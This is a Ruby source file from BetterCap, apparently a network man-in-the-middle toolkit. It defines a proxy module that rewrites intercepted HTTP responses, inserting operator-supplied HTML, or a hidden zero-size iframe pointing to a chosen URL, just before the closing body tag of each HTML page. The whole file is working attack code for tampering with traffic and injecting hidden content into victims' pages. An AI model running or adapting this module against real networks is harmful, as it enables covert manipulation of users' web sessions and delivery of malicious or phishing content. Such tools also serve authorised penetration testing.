# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

# This proxy module will take care of HTML code injection.
class InjectHTML < BetterCap::Proxy::Module
  # URL of the iframe if --html-iframe-url was specified.
  @@iframe = nil
  # HTML data to be injected.
  @@data = nil

  # Add custom command line arguments to the +opts+ OptionParser instance.
  def self.on_options(opts)
    opts.separator ""
    opts.separator "Inject HTML Proxy Module Options:"
    opts.separator ""

    opts.on( '--html-data STRING', 'HTML code to be injected.' ) do |v|
      @@data = v
    end

    opts.on( '--html-iframe-url URL', 'URL of the iframe that will be injected, if this option is specified an "iframe" tag will be injected.' ) do |v|
      @@iframe = v
    end
  end

  # Create an instance of this module and raise a BetterCap::Error if command
  # line arguments weren't correctly specified.
  def initialize
    raise BetterCap::Error, "No --html-data or --html-iframe-url options specified for the proxy module." if @@data.nil? and @@iframe.nil?
  end

  # Called by the BetterCap::Proxy::Proxy processor on each HTTP +request+ and
  # +response+.
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.info "Injecting HTML code into http://#{request.host}#{request.url}"

      if @@data.nil?
        response.body.sub!( '</body>', "<iframe src=\"#{@@iframe}\" frameborder=\"0\" height=\"0\" width=\"0\"></iframe></body>" )
      else
        response.body.sub!( '</body>', "#{@@data}</body>" )
      end
    end
  end
end
